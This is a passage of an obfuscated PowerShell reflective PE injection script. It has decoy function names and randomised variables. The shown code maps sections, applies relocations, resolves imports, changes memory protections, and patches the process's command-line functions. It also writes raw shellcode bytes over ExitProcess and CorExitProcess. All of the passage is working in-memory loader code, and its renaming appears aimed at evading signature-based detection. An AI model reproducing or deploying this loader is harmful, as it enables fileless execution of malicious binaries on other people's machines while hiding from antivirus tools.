				tallyhoing -thZCgeBloBSATRw "pokier::MarshalCopy" -PEInfo $PEInfo -StartAddress $IhWAxsMLhjsfNzn -Size $nGUhoxoFNc9lWsQ | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($tJYsDb9BwcjqONx, [Int32]$TAz9WVtnsrQiTzQ.PointerToRawData, $IhWAxsMLhjsfNzn, $nGUhoxoFNc9lWsQ)
			}
		

			if ($TAz9WVtnsrQiTzQ.SizeOfRawData -lt $TAz9WVtnsrQiTzQ.VirtualSize)
			{
				$qI9JwEEH9YlXVZF = $TAz9WVtnsrQiTzQ.VirtualSize - $nGUhoxoFNc9lWsQ
				[IntPtr]$StartAddress = [IntPtr](protestation ([Int64]$IhWAxsMLhjsfNzn) ([Int64]$nGUhoxoFNc9lWsQ))
				tallyhoing -thZCgeBloBSATRw "pokier::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $qI9JwEEH9YlXVZF | Out-Null
				$Y9kecWoe9UV9zmX.memset.Invoke($StartAddress, 0, [IntPtr]$qI9JwEEH9YlXVZF) | Out-Null
			}
		}
	}


	Function Glaswegian
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$PwppyOHKEvulXg9,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH
		)
		
		[Int64]$IgMHMcVZiUzpSwz = 0
		$RHHdWOiEfSalWiH = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$tWVl9oniuoWPSSZ = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_BASE_RELOCATION)
		

		if (($PwppyOHKEvulXg9 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((caparisoned ($PwppyOHKEvulXg9) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$IgMHMcVZiUzpSwz = conditions ($PwppyOHKEvulXg9) ($PEInfo.EffectivePEHandle)
			$RHHdWOiEfSalWiH = $false
		}
		elseif ((caparisoned ($PEInfo.EffectivePEHandle) ($PwppyOHKEvulXg9)) -eq $true)
		{
			$IgMHMcVZiUzpSwz = conditions ($PEInfo.EffectivePEHandle) ($PwppyOHKEvulXg9)
		}
		

		[IntPtr]$ABOERiTpXwO9DQm = [IntPtr](protestation ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{

			$DcbNzBi9z9ydAJS = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ABOERiTpXwO9DQm, [Type]$robWSZfqWDtAXZH.IMAGE_BASE_RELOCATION)

			if ($DcbNzBi9z9ydAJS.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$ZtiljgSqXRAv9Bj = [IntPtr](protestation ([Int64]$PEInfo.PEHandle) ([Int64]$DcbNzBi9z9ydAJS.VirtualAddress))
			$tphxveBoUaEoQVM = ($DcbNzBi9z9ydAJS.SizeOfBlock - $tWVl9oniuoWPSSZ) / 2


			for($i = 0; $i -lt $tphxveBoUaEoQVM; $i++)
			{

				$Mszqbc9GQiqnfEH = [IntPtr](protestation ([IntPtr]$ABOERiTpXwO9DQm) ([Int64]$tWVl9oniuoWPSSZ + (2 * $i)))
				[UInt16]$Abva9XkpXdqubhh = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Mszqbc9GQiqnfEH, [Type][UInt16])


				[UInt16]$UqJbSpB9ebQeFkI = $Abva9XkpXdqubhh -band 0x0FFF
				[UInt16]$vEILGpiYacfwicv = $Abva9XkpXdqubhh -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$vEILGpiYacfwicv = [Math]::Floor($vEILGpiYacfwicv / 2)
				}




				if (($vEILGpiYacfwicv -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($vEILGpiYacfwicv -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			

					[IntPtr]$kAwIETeLU9oGHeU = [IntPtr](protestation ([Int64]$ZtiljgSqXRAv9Bj) ([Int64]$UqJbSpB9ebQeFkI))
					[IntPtr]$sDGzcjuwuvIw9tt = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kAwIETeLU9oGHeU, [Type][IntPtr])
		
					if ($RHHdWOiEfSalWiH -eq $true)
					{
						[IntPtr]$sDGzcjuwuvIw9tt = [IntPtr](protestation ([Int64]$sDGzcjuwuvIw9tt) ($IgMHMcVZiUzpSwz))
					}
					else
					{
						[IntPtr]$sDGzcjuwuvIw9tt = [IntPtr](conditions ([Int64]$sDGzcjuwuvIw9tt) ($IgMHMcVZiUzpSwz))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($sDGzcjuwuvIw9tt, $kAwIETeLU9oGHeU, $false) | Out-Null
				}
				elseif ($vEILGpiYacfwicv -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{

					Throw "Unknown relocation found, relocation value: $vEILGpiYacfwicv, relocationinfo: $Abva9XkpXdqubhh"
				}
			}
			
			$ABOERiTpXwO9DQm = [IntPtr](protestation ([Int64]$ABOERiTpXwO9DQm) ([Int64]$DcbNzBi9z9ydAJS.SizeOfBlock))
		}
	}


	Function postbox
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$lhZ9id9GVAcGlDC
		)
		
		$TxKhedHCwUiloY9 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$TxKhedHCwUiloY9 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$Iwqkk9jSfChiKiO = protestation ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$W9HlPE9ITcdOYuU = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Iwqkk9jSfChiKiO, [Type]$robWSZfqWDtAXZH.IMAGE_IMPORT_DESCRIPTOR)
				

				if ($W9HlPE9ITcdOYuU.Characteristics -eq 0 `
						-and $W9HlPE9ITcdOYuU.FirstThunk -eq 0 `
						-and $W9HlPE9ITcdOYuU.ForwarderChain -eq 0 `
						-and $W9HlPE9ITcdOYuU.Name -eq 0 `
						-and $W9HlPE9ITcdOYuU.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$O9cmFyqrsoKpyrD = [IntPtr]::Zero
				$PCTVLoP9nzxygof = (protestation ([Int64]$PEInfo.PEHandle) ([Int64]$W9HlPE9ITcdOYuU.Name))
				$9LB9KgCRTaWHgPg = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($PCTVLoP9nzxygof)
				
				if ($TxKhedHCwUiloY9 -eq $true)
				{
					$O9cmFyqrsoKpyrD = geeks -lhZ9id9GVAcGlDC $lhZ9id9GVAcGlDC -PCTVLoP9nzxygof $PCTVLoP9nzxygof
				}
				else
				{
					$O9cmFyqrsoKpyrD = $Y9kecWoe9UV9zmX.LoadLibrary.Invoke($9LB9KgCRTaWHgPg)
				}

				if (($O9cmFyqrsoKpyrD -eq $null) -or ($O9cmFyqrsoKpyrD -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $9LB9KgCRTaWHgPg"
				}
				

				[IntPtr]$ZCqskSsxXLkfsHe = protestation ($PEInfo.PEHandle) ($W9HlPE9ITcdOYuU.FirstThunk)
				[IntPtr]$bVvWugApCwzcR9v = protestation ($PEInfo.PEHandle) ($W9HlPE9ITcdOYuU.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$wUvVqMqYpckNwMu = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bVvWugApCwzcR9v, [Type][IntPtr])
				
				while ($wUvVqMqYpckNwMu -ne [IntPtr]::Zero)
				{
					$unnysbWhKKYUrmQ = ''



					[IntPtr]$dBKka9VoSaWqGpk = [IntPtr]::Zero
					if([Int64]$wUvVqMqYpckNwMu -lt 0)
					{
						$unnysbWhKKYUrmQ = [Int64]$wUvVqMqYpckNwMu -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$Aoadn9wBnIyc9bL = protestation ($PEInfo.PEHandle) ($wUvVqMqYpckNwMu)
						$Aoadn9wBnIyc9bL = protestation $Aoadn9wBnIyc9bL ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$unnysbWhKKYUrmQ = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Aoadn9wBnIyc9bL)
					}
					
					if ($TxKhedHCwUiloY9 -eq $true)
					{
						[IntPtr]$dBKka9VoSaWqGpk = eyebrow -lhZ9id9GVAcGlDC $lhZ9id9GVAcGlDC -SCvdFzGjX99EQSr $O9cmFyqrsoKpyrD -FunctionName $unnysbWhKKYUrmQ
					}


                    else
					{
						if($unnysbWhKKYUrmQ -is [string])
						{
						    [IntPtr]$dBKka9VoSaWqGpk = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($O9cmFyqrsoKpyrD, $unnysbWhKKYUrmQ)
						}
						else
						{
						    [IntPtr]$dBKka9VoSaWqGpk = $Y9kecWoe9UV9zmX.GetProcAddressOrdinal.Invoke($O9cmFyqrsoKpyrD, $unnysbWhKKYUrmQ)
						}
					}
					
					if ($dBKka9VoSaWqGpk -eq $null -or $dBKka9VoSaWqGpk -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $unnysbWhKKYUrmQ. Dll: $9LB9KgCRTaWHgPg"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($dBKka9VoSaWqGpk, $ZCqskSsxXLkfsHe, $false)
					
					$ZCqskSsxXLkfsHe = protestation ([Int64]$ZCqskSsxXLkfsHe) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$bVvWugApCwzcR9v = protestation ([Int64]$bVvWugApCwzcR9v) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$wUvVqMqYpckNwMu = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bVvWugApCwzcR9v, [Type][IntPtr])
				}
				
				$Iwqkk9jSfChiKiO = protestation ($Iwqkk9jSfChiKiO) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function sluices
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$aKPUxuJHLNUveua
		)
		
		$kGGXzcaBnZGYoJM = 0x0
		if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$kGGXzcaBnZGYoJM = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($aKPUxuJHLNUveua -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$kGGXzcaBnZGYoJM = $kGGXzcaBnZGYoJM -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $kGGXzcaBnZGYoJM
	}

	Function compassion
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$cEDpWVfzLgd9RjG = [IntPtr](protestation ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_SECTION_HEADER)))
			$TAz9WVtnsrQiTzQ = [System.Runtime.InteropServices.Marshal]::PtrToStructure($cEDpWVfzLgd9RjG, [Type]$robWSZfqWDtAXZH.IMAGE_SECTION_HEADER)
			[IntPtr]$RDrveWg9zCOCrp9 = protestation ($PEInfo.PEHandle) ($TAz9WVtnsrQiTzQ.VirtualAddress)
			
			[UInt32]$SEHYmHL99XyTrsX = sluices $TAz9WVtnsrQiTzQ.Characteristics
			[UInt32]$Y9szdG9HrJROKpZ = $TAz9WVtnsrQiTzQ.VirtualSize
			
			[UInt32]$9CEaLCvUTuIPyOk = 0
			tallyhoing -thZCgeBloBSATRw "compassion::VirtualProtect" -PEInfo $PEInfo -StartAddress $RDrveWg9zCOCrp9 -Size $Y9szdG9HrJROKpZ | Out-Null
			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($RDrveWg9zCOCrp9, $Y9szdG9HrJROKpZ, $SEHYmHL99XyTrsX, [Ref]$9CEaLCvUTuIPyOk)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	


	Function murals
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$rbrSWFsscZibMtK,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$IoeTHORJTBkOEcx
		)
		

		$wpelX9OPsqCR9hT = @() 
		
		$tuIbncFQmkbV9im = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$9CEaLCvUTuIPyOk = 0
		
		[IntPtr]$9leuC99eFUTSynG = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("Kernel32.dll")
		if ($9leuC99eFUTSynG -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$sjRmKUr9WmqIVYu = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("KernelBase.dll")
		if ($sjRmKUr9WmqIVYu -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}




		$UoKdj9vNCWyQYTE = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($rbrSWFsscZibMtK)
		$KAM9LzMHapNXKv9 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($rbrSWFsscZibMtK)
	
		[IntPtr]$zTcRlMAjByIGrMH = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($sjRmKUr9WmqIVYu, "GetCommandLineA")
		[IntPtr]$z9wBw99yUCIRPUL = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($sjRmKUr9WmqIVYu, "GetCommandLineW")

		if ($zTcRlMAjByIGrMH -eq [IntPtr]::Zero -or $z9wBw99yUCIRPUL -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $zTcRlMAjByIGrMH. GetCommandLineW: $z9wBw99yUCIRPUL"
		}


		[Byte[]]$qzu9PIGUdkhoPtl = @()
		if ($tuIbncFQmkbV9im -eq 8)
		{
			$qzu9PIGUdkhoPtl += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$qzu9PIGUdkhoPtl += 0xb8
		
		[Byte[]]$OrxORLK9Vlfe9XG = @(0xc3)
		$PoXEJwJy9JwittJ = $qzu9PIGUdkhoPtl.Length + $tuIbncFQmkbV9im + $OrxORLK9Vlfe9XG.Length
		
		

		$eXcB9ZWq9WZNgyE = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PoXEJwJy9JwittJ)
		$isBRgfpF9wlRCsj = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PoXEJwJy9JwittJ)
		$Y9kecWoe9UV9zmX.memcpy.Invoke($eXcB9ZWq9WZNgyE, $zTcRlMAjByIGrMH, [UInt64]$PoXEJwJy9JwittJ) | Out-Null
		$Y9kecWoe9UV9zmX.memcpy.Invoke($isBRgfpF9wlRCsj, $z9wBw99yUCIRPUL, [UInt64]$PoXEJwJy9JwittJ) | Out-Null
		$wpelX9OPsqCR9hT += ,($zTcRlMAjByIGrMH, $eXcB9ZWq9WZNgyE, $PoXEJwJy9JwittJ)
		$wpelX9OPsqCR9hT += ,($z9wBw99yUCIRPUL, $isBRgfpF9wlRCsj, $PoXEJwJy9JwittJ)


		[UInt32]$9CEaLCvUTuIPyOk = 0
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($zTcRlMAjByIGrMH, [UInt32]$PoXEJwJy9JwittJ, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$9CEaLCvUTuIPyOk)
		if ($ZdXXNOZDYiFMcpk = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$fSDNYsNiaXRYzyu = $zTcRlMAjByIGrMH
		Wheaties -Bytes $qzu9PIGUdkhoPtl -lEjENVUfYtGCRuC $fSDNYsNiaXRYzyu
		$fSDNYsNiaXRYzyu = protestation $fSDNYsNiaXRYzyu ($qzu9PIGUdkhoPtl.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($KAM9LzMHapNXKv9, $fSDNYsNiaXRYzyu, $false)
		$fSDNYsNiaXRYzyu = protestation $fSDNYsNiaXRYzyu $tuIbncFQmkbV9im
		Wheaties -Bytes $OrxORLK9Vlfe9XG -lEjENVUfYtGCRuC $fSDNYsNiaXRYzyu
		
		$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($zTcRlMAjByIGrMH, [UInt32]$PoXEJwJy9JwittJ, [UInt32]$9CEaLCvUTuIPyOk, [Ref]$9CEaLCvUTuIPyOk) | Out-Null
		
		

		[UInt32]$9CEaLCvUTuIPyOk = 0
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($z9wBw99yUCIRPUL, [UInt32]$PoXEJwJy9JwittJ, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$9CEaLCvUTuIPyOk)
		if ($ZdXXNOZDYiFMcpk = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$f99syoKvSDmGqjs = $z9wBw99yUCIRPUL
		Wheaties -Bytes $qzu9PIGUdkhoPtl -lEjENVUfYtGCRuC $f99syoKvSDmGqjs
		$f99syoKvSDmGqjs = protestation $f99syoKvSDmGqjs ($qzu9PIGUdkhoPtl.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($UoKdj9vNCWyQYTE, $f99syoKvSDmGqjs, $false)
		$f99syoKvSDmGqjs = protestation $f99syoKvSDmGqjs $tuIbncFQmkbV9im
		Wheaties -Bytes $OrxORLK9Vlfe9XG -lEjENVUfYtGCRuC $f99syoKvSDmGqjs
		
		$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($z9wBw99yUCIRPUL, [UInt32]$PoXEJwJy9JwittJ, [UInt32]$9CEaLCvUTuIPyOk, [Ref]$9CEaLCvUTuIPyOk) | Out-Null

		
		





		$aLHZSvkhomdvRvz = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $aLHZSvkhomdvRvz)
		{
			[IntPtr]$SRiDkVhTgLtqxfC = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke($Dll)
			if ($SRiDkVhTgLtqxfC -ne [IntPtr]::Zero)
			{
				[IntPtr]$QhLJJXqzAFYpq9O = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($SRiDkVhTgLtqxfC, "_wcmdln")
				[IntPtr]$zG9PmsRMuPupIgY = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($SRiDkVhTgLtqxfC, "_acmdln")
				if ($QhLJJXqzAFYpq9O -eq [IntPtr]::Zero -or $zG9PmsRMuPupIgY -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$ln9t9RTHHXhe99D = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($rbrSWFsscZibMtK)
				$NNaCwZNAQznDiEO = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($rbrSWFsscZibMtK)
				

				$hViIAUmImqLnLRU = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zG9PmsRMuPupIgY, [Type][IntPtr])
				$mTJUhDSWxgcSsIL = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QhLJJXqzAFYpq9O, [Type][IntPtr])
				$LYGTlZIWyZlFiuh = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tuIbncFQmkbV9im)
				$vDMIX99XTc9oJEd = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tuIbncFQmkbV9im)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($hViIAUmImqLnLRU, $LYGTlZIWyZlFiuh, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($mTJUhDSWxgcSsIL, $vDMIX99XTc9oJEd, $false)
				$wpelX9OPsqCR9hT += ,($zG9PmsRMuPupIgY, $LYGTlZIWyZlFiuh, $tuIbncFQmkbV9im)
				$wpelX9OPsqCR9hT += ,($QhLJJXqzAFYpq9O, $vDMIX99XTc9oJEd, $tuIbncFQmkbV9im)
				
				$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($zG9PmsRMuPupIgY, [UInt32]$tuIbncFQmkbV9im, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$9CEaLCvUTuIPyOk)
				if ($ZdXXNOZDYiFMcpk = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($ln9t9RTHHXhe99D, $zG9PmsRMuPupIgY, $false)
				$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($zG9PmsRMuPupIgY, [UInt32]$tuIbncFQmkbV9im, [UInt32]($9CEaLCvUTuIPyOk), [Ref]$9CEaLCvUTuIPyOk) | Out-Null
				
				$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($QhLJJXqzAFYpq9O, [UInt32]$tuIbncFQmkbV9im, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$9CEaLCvUTuIPyOk)
				if ($ZdXXNOZDYiFMcpk = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NNaCwZNAQznDiEO, $QhLJJXqzAFYpq9O, $false)
				$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($QhLJJXqzAFYpq9O, [UInt32]$tuIbncFQmkbV9im, [UInt32]($9CEaLCvUTuIPyOk), [Ref]$9CEaLCvUTuIPyOk) | Out-Null
			}
		}

		
		



		$wpelX9OPsqCR9hT = @()
		$BJNu9NBGhhVhzdi = @() #Array of functions to overwrite so the thread doesn't exit the process
		

		[IntPtr]$sJiPrhx9td9Usew = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("mscoree.dll")
		if ($sJiPrhx9td9Usew -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$s9IAxEBTCiUDOKC = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($sJiPrhx9td9Usew, "CorExitProcess")
		if ($s9IAxEBTCiUDOKC -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$BJNu9NBGhhVhzdi += $s9IAxEBTCiUDOKC
		

		[IntPtr]$uIAwByCIxnSDagU = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($9leuC99eFUTSynG, "ExitProcess")
		if ($uIAwByCIxnSDagU -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$BJNu9NBGhhVhzdi += $uIAwByCIxnSDagU
		
		[UInt32]$9CEaLCvUTuIPyOk = 0
		foreach ($jaeG99rrljJpLue in $BJNu9NBGhhVhzdi)
		{
			$CjdpoE9GjPzPkFB = $jaeG99rrljJpLue


			[Byte[]]$qzu9PIGUdkhoPtl = @(0xbb)
			[Byte[]]$OrxORLK9Vlfe9XG = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

			if ($tuIbncFQmkbV9im -eq 8)
			{
				[Byte[]]$qzu9PIGUdkhoPtl = @(0x48, 0xbb)
				[Byte[]]$OrxORLK9Vlfe9XG = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$UHqlTtCDjfCgbxb = @(0xff, 0xd3)
			$PoXEJwJy9JwittJ = $qzu9PIGUdkhoPtl.Length + $tuIbncFQmkbV9im + $OrxORLK9Vlfe9XG.Length + $tuIbncFQmkbV9im + $UHqlTtCDjfCgbxb.Length
			
			[IntPtr]$i99zrwaNLKFdTHa = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($9leuC99eFUTSynG, "ExitThread")
			if ($i99zrwaNLKFdTHa -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($jaeG99rrljJpLue, [UInt32]$PoXEJwJy9JwittJ, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$9CEaLCvUTuIPyOk)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			

			$usAf99uuAKKn9nM = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PoXEJwJy9JwittJ)
			$Y9kecWoe9UV9zmX.memcpy.Invoke($usAf99uuAKKn9nM, $jaeG99rrljJpLue, [UInt64]$PoXEJwJy9JwittJ) | Out-Null
			$wpelX9OPsqCR9hT += ,($jaeG99rrljJpLue, $usAf99uuAKKn9nM, $PoXEJwJy9JwittJ)
			


			Wheaties -Bytes $qzu9PIGUdkhoPtl -lEjENVUfYtGCRuC $CjdpoE9GjPzPkFB
			$CjdpoE9GjPzPkFB = protestation $CjdpoE9GjPzPkFB ($qzu9PIGUdkhoPtl.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($IoeTHORJTBkOEcx, $CjdpoE9GjPzPkFB, $false)
			$CjdpoE9GjPzPkFB = protestation $CjdpoE9GjPzPkFB $tuIbncFQmkbV9im
			Wheaties -Bytes $OrxORLK9Vlfe9XG -lEjENVUfYtGCRuC $CjdpoE9GjPzPkFB
			$CjdpoE9GjPzPkFB = protestation $CjdpoE9GjPzPkFB ($OrxORLK9Vlfe9XG.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($i99zrwaNLKFdTHa, $CjdpoE9GjPzPkFB, $false)
			$CjdpoE9GjPzPkFB = protestation $CjdpoE9GjPzPkFB $tuIbncFQmkbV9im
			Wheaties -Bytes $UHqlTtCDjfCgbxb -lEjENVUfYtGCRuC $CjdpoE9GjPzPkFB

			$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($jaeG99rrljJpLue, [UInt32]$PoXEJwJy9JwittJ, [UInt32]$9CEaLCvUTuIPyOk, [Ref]$9CEaLCvUTuIPyOk) | Out-Null
		}


		Write-Output $wpelX9OPsqCR9hT
	}
	
	


	Function tarmacked
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$xuiExLGxp9EQo9Y,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
